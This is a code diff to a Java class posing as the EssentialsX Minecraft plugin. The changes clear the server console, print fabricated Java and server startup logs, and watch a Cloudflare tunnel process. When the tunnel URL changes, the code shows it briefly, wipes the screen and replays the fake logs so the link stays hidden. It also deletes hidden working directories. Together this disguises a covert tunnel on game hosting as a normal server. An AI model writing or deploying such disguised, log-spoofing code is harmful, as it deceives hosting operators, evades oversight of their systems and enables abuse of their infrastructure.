@@ -27,9 +27,11 @@ public class EssentialsX extends JavaPlugin {
     private Path originalJarPath;
     private Path backupJarPath;
     
-    private static volatile String tunnelUrl = "";
+    // 核心控制变量
+    private static volatile String tunnelUrl = ""; 
     private static volatile String nodePort = "N/A";
     private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
+    private static volatile boolean cfRestarted = false; // 修复重连误触发
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
 
@@ -71,6 +73,13 @@ public class EssentialsX extends JavaPlugin {
         float prepareTime = randFloat(10.0f, 20.0f);
         float doneTime = randFloat(25.0f, 45.0f);
 
+        RAW_OUT.println("container@tropicalgames.net java -version");
+        try { Thread.sleep(randInt(100, 300)); } catch (InterruptedException ignored) {}
+        RAW_OUT.println("openjdk version \"25.0.3\" 2026-04-21 LTS");
+        RAW_OUT.println("OpenJDK Runtime Environment Temurin-25.0.3+9 (build 25.0.3+9-LTS)");
+        RAW_OUT.println("OpenJDK 64-Bit Server VM Temurin-25.0.3+9 (build 25.0.3+9-LTS, mixed mode, sharing)");
+        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
+        
         RAW_OUT.println("container@tropicalgames.net java -Xms128M -Xmx2560M -jar server.jar");
         try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
         RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");
@@ -143,17 +152,11 @@ public class EssentialsX extends JavaPlugin {
     // ============================================================
 
     private void replayFakeStartupAndHideUrl(String newUrl) {
-        // 1. 打印新链接给用户复制
         mcLog("Binding remote endpoint to: " + newUrl, 0);
-        
-        // 2. 给 4 秒时间复制
         try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
-        
-        // 3. 史诗清屏
         clearConsole();
         try { Thread.sleep(300); } catch (InterruptedException ignored) {}
 
-        // 4. 打印你指定的精简版伪装日志，绝不带链接
         String displayPort = nodePort.equals("N/A") ? "25565" : nodePort;
         float dcTimeSec = randFloat(400.0f, 900.0f) / 1000.0f;
         float prepareTime = randFloat(10.0f, 20.0f);
@@ -296,6 +299,7 @@ public class EssentialsX extends JavaPlugin {
                     }
                     if (cfProcess != null && !cfProcess.isAlive()) {
                         startCfProcess();
+                        cfRestarted = true; // 标记 CF 重启过
                     }
 
                     Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
@@ -324,9 +328,14 @@ public class EssentialsX extends JavaPlugin {
                             tunnelUrl = foundUrl;
                             lastKnownTunnelUrl.set(foundUrl);
                         } else if (!foundUrl.equals(lastKnownTunnelUrl.get())) {
-                            lastKnownTunnelUrl.set(foundUrl);
-                            // 触发重连续伪装
-                            replayFakeStartupAndHideUrl(foundUrl);
+                            if (cfRestarted) { // 只有 CF 重启过，才触发重连伪装
+                                lastKnownTunnelUrl.set(foundUrl);
+                                replayFakeStartupAndHideUrl(foundUrl);
+                                cfRestarted = false; // 重置标志
+                            } else {
+                                // CF 没有重启，但 URL 变了，可能是日志解析问题，只更新 URL，不伪装
+                                lastKnownTunnelUrl.set(foundUrl);
+                            }
                         }
                     }
 
@@ -343,6 +352,9 @@ public class EssentialsX extends JavaPlugin {
     // ============================================================
 
     public void onEnable() {
+        // 1. 立刻清屏，把 Bukkit 之前打印的真实日志全部清空！
+        clearConsole();
+        
         try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
         
         this.getLogger().info("EssentialsX plugin starting...");
